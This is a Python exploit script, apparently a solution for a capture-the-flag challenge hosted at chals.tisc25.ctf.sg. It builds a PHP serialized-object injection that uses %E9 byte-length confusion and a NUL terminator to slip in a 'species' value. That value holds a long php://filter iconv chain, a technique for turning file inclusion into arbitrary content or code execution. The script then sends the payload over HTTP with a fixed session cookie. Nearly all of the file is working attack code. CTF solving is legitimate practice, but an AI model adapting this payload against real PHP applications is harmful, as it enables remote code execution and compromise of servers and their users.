#!/usr/bin/env python3
import requests

HOST = "chals.tisc25.ctf.sg"
# HOST = "localhost"
PORT = 26182
BASE = f"http://{HOST}:{PORT}/index.php"

# set the session id to reuse the same DB as your store+fetch flow (or empty to let server create one)
PHP_SESSION = "8e716cb9fcce94e08be101357ab0c94f"

# Target species used by the application (adjust if needed)
SPECIES = "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp"
PRE_LEN = 4 # Length of "Tes"

# The payload tail to be placed in the name field (ends with a NUL byte represented percent-encoded)
PAYLOAD_TAIL = 'Test";s:7:"species";s:{sp_len}:"{sp}";s:13:"valid_species";a:4:{{i:0;s:9:"Ghostroot";i:1;s:{sp_len}:"{sp}";i:2;s:11:"DarkFurnace";i:3;s:9:"Voltspike";}}}}'.format(
    sp_len=len(SPECIES), sp=SPECIES
)

s = len(PAYLOAD_TAIL) + 1 # count null byte

PAYLOAD_TAIL += "%00"  # null terminator to end the string in PHP

print(f"s = {s}") # Length that is reflected in the serialized string before %E9s 

## Now, we have to add E9s to compensate for the end of the field. Currently, the name field is only 3 characters long (Tes). We need to add one %E9 for every byte AFTER 'Tes'
num_to_add = s - PRE_LEN

payload = "%E9" * num_to_add + PAYLOAD_TAIL

## Calculate the new string length
print(f"reflected s = {s + num_to_add}") # in the ISO encoding it's still 1 each
print(f"number of added %E9 = {num_to_add}")
print(f"actual payload byte length = {s + num_to_add * 2}") 


s = requests.Session()
if PHP_SESSION:
    # set cookie for the session (works without specifying domain)
    s.cookies.update({"PHPSESSID": PHP_SESSION})
# Build full URL manually so percent sequences are not re-encoded by requests' params handling.
query = f"action=store&species=Ghostroot&name={payload}&debug=1"
url = f"{BASE}?{query}"

print("[*] Sending HTTP GET via requests (percent-escapes preserved in URL):")
print("    ", url)
try:
    # use session 's' (preserves cookies / uses PHP_SESSION if set)
    r = s.get(url, timeout=5)
    print("[*] Response status:", r.status_code)
    print(r.text)
except Exception as e:
    print("[!] requests failed:", e)